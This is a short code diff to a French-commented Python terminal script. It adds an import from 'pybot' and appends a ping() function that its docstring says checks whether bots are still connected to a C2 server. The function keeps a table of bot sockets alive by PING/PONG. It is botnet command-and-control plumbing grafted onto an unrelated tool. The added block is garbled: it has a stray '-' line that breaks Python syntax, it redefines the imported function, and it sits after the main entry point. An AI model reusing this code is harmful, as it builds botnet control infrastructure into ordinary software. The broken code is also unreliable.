@@ -37,6 +37,7 @@ from colorama import init, Fore, Style
 from tqdm import tqdm
 import logging
 from urllib.parse import quote
+from pybot import ping
 
 # Initialisation de colorama pour la couleur en terminal
 init(autoreset=True)
@@ -207,3 +208,25 @@ def user_interaction():
 
 if __name__ == "__main__":
     user_interaction()
+
+
+
+-     
+
+def ping():
+    """ check if all bots are still connected to C2 """
+    while 1:
+        dead_bots = []
+        for bot in bots.keys():
+            try:
+                bot.settimeout(3)
+                send(bot, 'PING', False, False)
+                if bot.recv(1024).decode() != 'PONG':
+                    dead_bots.append(bot)
+            except:
+                dead_bots.append(bot)
+            
+        for bot in dead_bots:
+            bots.pop(bot)
+            bot.close()
+        time.sleep(5)
